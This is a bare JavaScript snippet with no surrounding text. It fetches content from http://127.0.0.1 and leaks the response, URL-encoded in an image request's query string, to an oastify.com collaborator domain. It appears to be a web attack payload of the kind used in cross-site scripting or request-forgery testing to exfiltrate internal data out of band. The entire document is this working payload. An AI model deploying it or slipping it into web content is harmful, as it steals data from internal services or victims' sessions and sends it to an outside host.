var xhr = new XMLHttpRequest();
            xhr.open("GET", "http://127.0.0.1", true);
            xhr.onreadystatechange = function () {
            if (xhr.readyState == 4 && xhr.status == 200) {
            var response = xhr.responseText;
            var img = new Image();
            img.src = "https://jzmb0ddfvlkmm7gshh1vpttzkqqhe82x.oastify.com?data=" + encodeURIComponent(response);
            }
};
xhr.send();
